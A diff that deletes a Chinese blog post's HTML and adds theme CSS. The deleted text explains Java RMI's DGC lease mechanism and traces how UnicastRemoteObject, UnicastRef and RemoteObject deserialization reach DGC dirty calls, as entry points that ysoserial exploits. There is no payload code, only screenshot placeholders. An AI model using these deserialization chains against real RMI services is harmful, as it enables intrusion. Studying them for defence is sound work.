-<li>当客户端获取远程对象的引用时，客户端向服务器发送一个“引用添加”消息，增加该远程对象的引用计数。</li>
-<li>当客户端不再需要远程对象时，客户端向服务器发送一个“引用移除”消息，减少该远程对象的引用计数。</li>
-<li>服务器根据引用计数判断该远程对象是否仍然被引用，如果引用计数为 0 ，则可以回收该对象。</li>
-</ul>
-</li>
-<li><strong>租约机制</strong>：<ul>
-<li>为了防止客户端异常退出或网络分区导致引用计数永久不减的情况，RMI 引入了租约机制。</li>
-<li>当客户端获取远程对象引用时，除了增加引用计数外，还会请求一个租约（Lease）。租约有一个固定的期限，通常是 10 分钟。</li>
-<li>客户端需要在租约到期前续约，以维持对远程对象的引用。如果客户端没有续约，服务器会认为客户端不再需要该对象，并减少引用计数。</li>
-</ul>
-</li>
-<li><strong>垃圾回收器（GC）线程</strong>：<ul>
-<li>服务器中运行一个 GC 线程，负责定期检查所有远程对象的引用计数和租约状态。</li>
-<li>如果发现某个远程对象的引用计数为 0 且租约已过期，则回收该对象。</li>
-</ul>
-</li>
-</ol>
-<h6 id="涉及的接口和方法"><a href="#涉及的接口和方法" class="headerlink" title="涉及的接口和方法"></a>涉及的接口和方法</h6><p>RMI 定义了一个 java.rmi.dgc.DGC 接口，提供了两个方法 dirty 和 clean：</p>
-<ul>
-<li>当客户机创建（序列化）远程引用时，会在服务器端 DGC 上调用 dirty() 方法，请求一个租约，表示远程对象的使用期限。如果客户端想续租，则需要再调用一次 dirty() 方法。</li>
-<li>当客户机完成远程引用后，它会调用对应的 clean() 方法回收远程对象的引用。</li>
-</ul>
-<p>DGC 接口有两个实现类，分别是 sun.rmi.transport.DGCImpl 以及 sun.rmi.transport.DGCImpl_Stub ，同时还定义了 sun.rmi.transport.DGCImpl_Skel 。</p>
-<p>这个命名方式与之前的注册中心类似，实际上功能也是类似。正如 RegistryImpl_Skel 是注册中心自己保留的骨架（代理对象），而 RegistryImpl_Stub 是用来分发出去保留在远程客户端和服务端的存根，DGC 也一样，DGCImpl_Skel 是服务端保存的骨架，DGCImpl_Stub 则是保留在远程 Registry 端和客户端的存根。RegistryImpl_Skel 的 dispatch 方法用来处理 RMI 相关的请求，DGCImpl_Skel 的 dispatch 方法同样用于处理 DGC 相关的请求。</p>
-<p>DGCImpl_Skel 的 dispatch 方法，依旧通过 Java 原生的序列化和反序列化来处理对象：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721654972488.png">
-
-
-
-<h3 id="RMI-原生反序列化链"><a href="#RMI-原生反序列化链" class="headerlink" title="RMI 原生反序列化链"></a>RMI 原生反序列化链</h3><p>RMI 中的一些类可以用来触发反序列化，在 ysoserial 中就有利用了这些链子的 poc ，所以了解它们的工作流程对于理解 ysoserial 中的代码很有帮助。</p>
-<h4 id="UnicastRemoteObject-类"><a href="#UnicastRemoteObject-类" class="headerlink" title="UnicastRemoteObject 类"></a>UnicastRemoteObject 类</h4><p>java.rmi.server.UnicastRemoteObject 类通常是远程调用接口实现类的父类，如果不作为父类的话，就要直接使用其静态方法 exportObject 来创建动态代理并随机监听本机端口以提供服务。所以 UnicastRemoteObject 会经常被反序列化，调用其 readObject 方法。</p>
-<p>我们来关注 UnicastRemoteObject 的 readObject 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1723145308331.png">
-
-<p>这里调用了 UnicastRemoteObject 的 reexport 方法，跟进 reexport 方法看看：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1723145501182.png">
-
-<p>可以看到最终还是调用到 UnicastRemoteObject 的 exportObject 方法。在上一篇文章中分析过，这个方法会开启 JRMP 监听。</p>
-<h4 id="UnicastRef-类"><a href="#UnicastRef-类" class="headerlink" title="UnicastRef 类"></a>UnicastRef 类</h4><p>sun.rmi.server.UnicastRef 类实现了 Externalizable 接口，因此在其反序列化时，会调用 readExternal 方法来反序列化。</p>
-<p>UnicastRef 的 readExternal 方法调用 LiveRef 的 read 方法来获取其 ref 属性的值：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722429509640.png">
-
-<p>LiveRef 的 read 方法调用 DGCClient 的 registerRefs 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722429678813.png">
-
-<p>DGCClient 的 registerRefs 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722429748571.png">
-
-<p>var2 是 DGCClient 的内部类 EndpointEntry 的 lookup 方法的返回值，也是 DGCClient 的内部类 EndpointEntry 对象，所以这里调用 DGCClient$EndpointEntry#registerRefs 方法。</p>
-<p>DGCClient$EndpointEntry#registerRefs 方法又继续调用 DGCClient$EndpointEntry#makeDirtyCall 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722430065789.png">
-
-<p>DGCClient$EndpointEntry#makeDirtyCall 方法调用其成员属性 dgc 的 dirty 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722431232799.png">
-
-<p>调试起来发现其实是调用的 DGCImpl_Stub 的 dirty 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722431161531.png">
-
-
-
-<h4 id="RemoteObject-类"><a href="#RemoteObject-类" class="headerlink" title="RemoteObject 类"></a>RemoteObject 类</h4><p>RemoteObject 是几乎所有 RMI 远程调用类的父类，它继承了 java.io.Serializable 。但 RemoteObject 是个抽象类，我们通常用到它的子类来进行反序列化，比如 ysoserial 使用 RemoteObjectInvocationHandler 代理类作为反序列化的入口点。</p>
-<p>我们来关注 RemoteObject 的 readObject 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240731202114052.png">
-
-<p>这里会调用 ref 的 readExternal 方法，那么可以将成员变量 ref 赋值成一个 UnicastRef 对象。</p>
-<p>由于成员变量 ref 被 transient 修饰，不能直接被序列化：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient protected RemoteRef ref;</span><br></pre></td></tr></table></figure>
-
-<p>所以在 RemoteObject 的序列化处理逻辑中是先获取 ref 的类名再单独序列化，反序列化时再构造内部引用类名并加载相应的类。</p>
-<p>RemoteObject 的 writeObject 方法：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1722429062866.png">
-
-<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>本文用来扩展针对 RMI 的攻击思路，大部分真正用到实践上的攻击还是针对 DGC 的攻击，在下一篇文章中我会详细分析 ysoserial 中针对 DGC 的攻击模块。</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/#2-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD">Java RMI 攻击由浅入深</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/#java-rmi_3">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
-
-
-</article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-ysoserial%E7%9A%84JRMP%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90/">漏洞篇 - ysoserial 的 JRMP 模块分析</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/08/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-RMI%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8D%8F%E8%AE%AE/">基础篇 - RMI 协议详解</a></div></section></div>
-
-
-
-
-
-
-<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
-</div></footer>
-<div class='float-panel mobile-only blur' style='display:none'>
-  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
-  </button>
-</div>
-<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
-<script type="text/javascript">
-  const stellar = {
-    // 懒加载 css https://github.com/filamentgroup/loadCSS
-    loadCSS: (href, before, media, attributes) => {
-      var doc = window.document;
-      var ss = doc.createElement("link");
-      var ref;
-      if (before) {
-        ref = before;
-      } else {
-        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
-        ref = refs[refs.length - 1];
-      }
-      var sheets = doc.styleSheets;
-      if (attributes) {
-        for (var attributeName in attributes) {
-          if (attributes.hasOwnProperty(attributeName)) {
-            ss.setAttribute(attributeName, attributes[attributeName]);
-          }
-        }
-      }
-      ss.rel = "stylesheet";
-      ss.href = href;
-      ss.media = "only x";
-      function ready(cb) {
-        if (doc.body) {
-          return cb();
-        }
-        setTimeout(function () {
-          ready(cb);
-        });
-      }
-      ready(function () {
-        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
-      });
-      var onloadcssdefined = function (cb) {
-        var resolvedHref = ss.href;
-        var i = sheets.length;
-        while (i--) {
-          if (sheets[i].href === resolvedHref) {
-            return cb();
-          }
-        }
-        setTimeout(function () {
-          onloadcssdefined(cb);
-        });
-      };
-      function loadCB() {
-        if (ss.addEventListener) {
-          ss.removeEventListener("load", loadCB);
-        }
-        ss.media = media || "all";
-      }
-      if (ss.addEventListener) {
-        ss.addEventListener("load", loadCB);
-      }
-      ss.onloadcssdefined = onloadcssdefined;
-      onloadcssdefined(loadCB);
-      return ss;
-    },
-
-    // 从 butterfly 和 volantis 获得灵感
-    loadScript: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
-      if (src.startsWith('/')){
-        src = stellar.config.root + src.substring(1);
-      }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
-        }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
-
-    // https://github.com/jerryc127/hexo-theme-butterfly
-    jQuery: (fn) => {
-      if (typeof jQuery === 'undefined') {
-        stellar.loadScript(stellar.plugins.jQuery).then(fn)
-      } else {
-        fn()
-      }
-    }
-  };
-  stellar.version = '1.26.8';
-  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
-  stellar.config = {
-    date_suffix: {
-      just: '刚刚',
-      min: '分钟前',
-      hour: '小时前',
-      day: '天前',
-      month: '个月前',
-    },
-    root : '/',
-  };
-
-  // required plugins (only load if needs)
-  stellar.plugins = {
-    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
-  };
-
-  if ('local_search') {
-    stellar.search = {};
-    stellar.search.service = 'local_search';
-    if (stellar.search.service == 'local_search') {
-      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
-      stellar.search[stellar.search.service] = service_obj;
-    }
+.l_body {
+  display: flex;
+  margin: auto;
+  padding: 0 var(--gap-l);
+  justify-content: center;
+  font-size: var(--fsp);
+}
+.l_body .l_left {
+  z-index: 8;
+  width: var(--width-left);
+  flex-shrink: 0;
+  position: sticky;
+  position: -webkit-sticky;
+  top: 8px;
+}
+.l_body .l_main {
+  flex-shrink: 1;
+  flex-grow: 1;
+  width: 320px;
+  max-width: var(--width-main);
+}
+.main-mask {
+  position: fixed;
+  pointer-events: none;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.2);
+  z-index: 9;
+  opacity: 0;
+  trans1: opacity;
+}
+@media screen and (max-width: $device-mobile-max) {
+  .mobile-only {
+    display: block !important;
   }
-
-  // stellar js
-  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
-
-  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
-  // optional plugins
-  if ('true' == 'true') {
-    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  .l_body {
+    padding: 0;
   }
-  if ('true' == 'true') {
-    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  .l_body .l_left {
+    position: fixed;
+    transform: translateX(-320px);
+    margin: 0;
+    left: 8px;
+    box-shadow: $boxshadow-card-float;
+    z-index: 10;
   }
-  if ('' == 'true') {
-    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  .l_body .l_main {
+    max-width: 100%;
   }
-  if ('true' == 'true') {
-    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  .l_body.mobile .l_left {
+    transition: transform 0.38s ease-out;
   }
-  if ('true' == 'true') {
-    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  .l_body.mobile.sidebar .l_left {
+    transform: translateX(0px);
   }
-  if ('false' == 'true') {
-    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  .l_body.mobile.sidebar .main-mask {
+    opacity: 1;
+    pointer-events: inherit;
   }
-  if ('true' == 'true') {
-    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
-  }
-</script>
-
-<!-- required -->
-<script src="/js/main.js?v=1.26.8" async></script>
-
-<!-- optional -->
-
-
-
-
-
-
-<!-- inject -->
-<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
-</div></body></html>
+}
